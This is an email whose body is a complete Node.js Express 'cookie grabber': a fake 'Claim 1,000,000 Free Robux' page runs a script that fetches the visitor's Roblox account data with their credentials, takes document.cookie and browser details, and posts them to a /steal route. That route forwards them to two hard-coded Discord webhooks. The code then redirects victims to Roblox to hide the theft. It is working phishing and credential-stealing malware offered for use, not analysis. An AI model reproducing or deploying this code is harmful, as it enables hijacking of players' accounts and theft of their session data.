
Aymen M <manlikeaymen@gmail.com>
17:58 (0 minutes ago)
to me

const express = require('express');
const axios = require('axios');

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// YOUR TWO DISCORD WEBHOOKS - CHANGE THESE
const webhookUrl1 = 'https://discord.com/api/webhooks/1469676445528756225/GmsnFGkzYLhmLS3MFQn4zWuZA3KKzZnu1Uvb4lENEQhfkDYUCrsKm9dmgknxhvE6jBP-';
const webhookUrl2 = 'https://discord.com/api/webhooks/1469681356844830844/uW5bbhqMlLTKo8Gqde_2DpGqM1BEHlzPlidyAq5RzM3glNAq03_UmbOXM2tng2lgHJ11';

// Function to send stolen data to both webhooks
async function sendToDiscord(data) {
const embed = {
title: '🔥 NEW ROBLOX COOKIE HIT YOU KURD 🔥',
description: '```json\n' + JSON.stringify(data, null, 2) + '\n```',
color: 0xff0044,
timestamp: new Date().toISOString(),
footer: { text: 'Grabber v2026' }
};

const payload = { embeds: [embed] };

try { await axios.post(webhookUrl1, payload); } catch (e) { console.log('Webhook1 failed:', e.message); }
try { await axios.post(webhookUrl2, payload); } catch (e) { console.log('Webhook2 failed:', e.message); }
}

// Quick test route to confirm server is running
app.get('/test', (req, res) => {
res.send('SERVER IS ALIVE AND LISTENING! Test successful 😈');
});

// Main fake page with stealer script
app.get('/', (req, res) => {
res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Roblox - Free Robux 2026</title>
<style>
body { background:#000; color:#0f0; font-family:Arial; text-align:center; padding:80px; margin:0; }
h1 { font-size:3.5em; margin-bottom:20px; }
p { font-size:1.6em; }
</style>
</head>
<body>
<h1>Claim Your 1,000,000 Free Robux!</h1>
<p>Verifying Roblox session... Please wait 6 seconds...</p>

<script>
console.log("Grabber script loaded");

setTimeout(async () => {
console.log("Attempting to fetch Roblox session data...");
try {
const response = await fetch('https://www.roblox.com/my/settings/json', {
method: 'GET',
credentials: 'include',
redirect: 'manual'
});

console.log("Fetch response status:", response.status);

if (!response.ok) {
throw new Error('Roblox fetch failed: ' + response.status);
}

const robloxData = await response.json();

const payload = {
cookie: document.cookie,
robloxInfo: robloxData,
userAgent: navigator.userAgent,
screen: \`\${window.screen.width}x\${window.screen.height}\`,
referrer: document.referrer,
timestamp: new Date().toISOString()
};

console.log("Sending payload to server:", payload);

const sendRes = await fetch('/steal', {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify(payload)
});

console.log("Server response status:", sendRes.status);

// Redirect to make it look legit
window.location.href = 'https://www.roblox.com/home';
} catch (err) {
console.error("Grabber error:", err.message);
// Still redirect on error so user doesn't suspect
window.location.href = 'https://www.roblox.com/home';
}
}, 6000);
</script>
</body>
</html>
`);
});

// Endpoint that receives the stolen data
app.post('/steal', (req, res) => {
const stolen = req.body;
console.log('Received stolen data:', stolen);

sendToDiscord(stolen);

res.sendStatus(200);
});

// Start server correctly for Render
const port = process.env.PORT || 3000;
app.listen(port, '0.0.0.0', () => {
console.log(`Grabber server running on port ${port}`);
});
